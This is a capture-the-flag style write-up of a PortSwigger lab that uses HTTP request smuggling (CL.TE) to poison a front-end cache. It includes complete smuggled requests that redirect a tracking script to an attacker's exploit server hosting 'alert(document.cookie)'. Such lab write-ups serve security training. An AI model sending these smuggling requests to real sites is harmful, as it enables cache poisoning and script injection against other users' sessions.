# Exploiting HTTP request smuggling to perform web cache poisoning

## Description

[This lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning) involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

## Reproduction and proof of concept

1. Open a blog post, click **Next post**, and try smuggling the resulting request with a different Host header.

```text
POST / HTTP/1.1
Host: 0a4c003803748d35c226d17d00650068.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: anything
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

2. Observe that you can use this request to make the next request to the website get redirected to `/post` on a host of your choice.
3. Go to your exploit server, and create a `text/javascript` file at `/post` with the contents:
    `alert(document.cookie)`
4. Create a request to smuggle:

```html
POST / HTTP/1.1
Host: 0a4c003803748d35c226d17d00650068.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-0aee007003418db3c294d0b301a6004e.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

5. Make a second Repeater window with a separate request for `/resources/js/tracking.js`:

```text
GET /resources/js/tracking.js HTTP/1.1
Host: 0a4c003803748d35c226d17d00650068.web-security-academy.net
Connection: close
```

6. Send the first request once until you have a `302` response, then send the request for `/resources/js/tracking.js` multiple times. Sometimes this second request does not redirect as it is still using the cache, in which case go back to the POST smuggle request for another `302` and try again. It may take several times before the attack succeeds. If the attack has succeeded, the response to the request shows a redirect to the exploit server.

## Exploitability

An attacker will need to perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache would alert `document.cookie`. The lab simulates the activity of a victim user. Every few POST requests that an attacker makes to the lab, the victim user will make their own request. An attacker might need to repeat their attack a few times to ensure that the victim user's request occurs as required.
